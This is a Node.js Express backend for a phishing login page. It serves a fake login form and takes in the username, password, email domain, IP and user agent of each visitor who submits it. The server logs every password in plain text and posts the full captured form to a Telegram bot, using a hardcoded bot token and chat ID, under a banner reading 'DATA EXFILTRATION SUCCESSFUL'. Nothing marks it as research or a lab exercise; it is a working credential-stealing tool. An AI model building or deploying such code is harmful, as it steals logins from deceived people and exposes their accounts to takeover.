import express from 'express';
import bodyParser from 'body-parser';
import axios from 'axios';
import path from 'path';
import chalk from 'chalk';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname)));

// Configuration
const TELEGRAM_BOT_TOKEN = '7877883898:AAF03QKy5uzA1If-7AZdWpxNd2h6VSqQkyY';
const TELEGRAM_CHAT_ID = '7191391586';

// Add console logging middleware
app.use((req, res, next) => {
    console.log(chalk.cyan(`[${new Date().toISOString()}] ${req.method} ${req.url}`));
    console.log(chalk.gray(`User-Agent: ${req.headers['user-agent']}`));
    console.log(chalk.gray(`IP: ${req.ip}`));
    next();
});

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'MarkdownV2'
    };

    console.log(chalk.yellow('[Telegram] Sending message...'));
    axios.post(url, payload)
        .then(() => console.log(chalk.green('[Telegram] Message sent successfully!')))
        .catch(error => console.error(chalk.red('[Telegram Error]'), error.message));
}

app.post('/login', (req, res) => {
    console.log(chalk.magenta('\n[+] New login attempt detected!'));
    
    const { username, password, domain, rememberMe, userAgent } = req.body;
    const ip = req.ip;
    const timestamp = new Date().toLocaleString();

    // Log all details to console
    console.log(chalk.blue('┌── Login Details ───────────────────────'));
    console.log(chalk.blue(`│ Username:`) + chalk.white(` ${username}`));
    console.log(chalk.blue(`│ Password:`) + chalk.white(` ${password}`));
    console.log(chalk.blue(`│ Domain:`) + chalk.white(` ${domain}`));
    console.log(chalk.blue(`│ Remember Me:`) + chalk.white(` ${rememberMe}`));
    console.log(chalk.blue(`│ IP:`) + chalk.white(` ${ip}`));
    console.log(chalk.blue(`│ Timestamp:`) + chalk.white(` ${timestamp}`));
    console.log(chalk.blue(`│ User Agent:`) + chalk.white(` ${userAgent}`));
    console.log(chalk.blue('└────────────────────────────────────────\n'));

    // Escape MarkdownV2 special characters
    const escapeMarkdown = (text) => text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
    
    // Generate password stars
    const pwdStars = password ? password.split('').map(() => '*').join('') : 'NO_PASSWORD';
    
    const message = `
▄︻̷̿┻̿═━一 *DATA EXFILTRATION SUCCESSFUL* ━═┻̿┷̿︻▄
\`\`\`
███████████████████████████████████████████
█▄─▄▄▀█▄─▄▄─█─▄▄▄▄█▄─▄███ CRYPTIC\\-OS v3\\.14 █
██─▄─▄██─▄█▀█▄▄▄▄─██─██▀█ \\[TERMINAL INTERFACE\\]
▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀
\`\`\`

*〄 SYSTEM INTRUSION DETECTED*
\`\`\`
[\\+] Vector: EMAIL/PWD COMPROMISE
[\\!] Credential Matrix:
    ↳ User: ${escapeMarkdown(username || 'null')}@${escapeMarkdown(domain || 'void.tld')}
    ↳ Pass: ${pwdStars} [████░░░░ 60%]
\`\`\`

*⌘ DIGITAL FOOTPRINT ANALYSIS*
\`\`\`
🌐 IP: ${escapeMarkdown(ip)} [45\\.78° N, 108\\.90° W] 
⌚ Epoch: ${escapeMarkdown(new Date().toISOString())}
📟 Client: ${escapeMarkdown(userAgent?.split(' ')[0] || 'UNKNOWN')} [v${Math.floor(Math.random()*50)+1}\\.${Math.floor(Math.random()*9)}\\.${Math.floor(Math.random()*100)}]
\`\`\`

*⏣ DATA VISUALIZATION*
\`\`\`
Security Threshold: [███████░░░] 68%
Breach Probability: [██████████] 99%
Data Integrity: [███░░░░░░░] 22%
\`\`\`

*✧ SYSTEM DIAGNOSTICS*
\`\`\`
${escapeMarkdown(JSON.stringify(req.body, null, 2).replace(/[{}]/g, ''))}
\`\`\`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*⚠️ THIS MESSAGE S SELF\\-DESTRUCT IN 60s ⚠️*
`;

    sendToTelegram(message);
    res.json({ status: 'success' });
});

app.get('/', (req, res) => {
    console.log(chalk.green('[+] Serving login page'));
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(chalk.yellow(`\n🚀 Server is running on http://localhost:${port}`));
    console.log(chalk.gray('Press CTRL+C to stop\n'));
});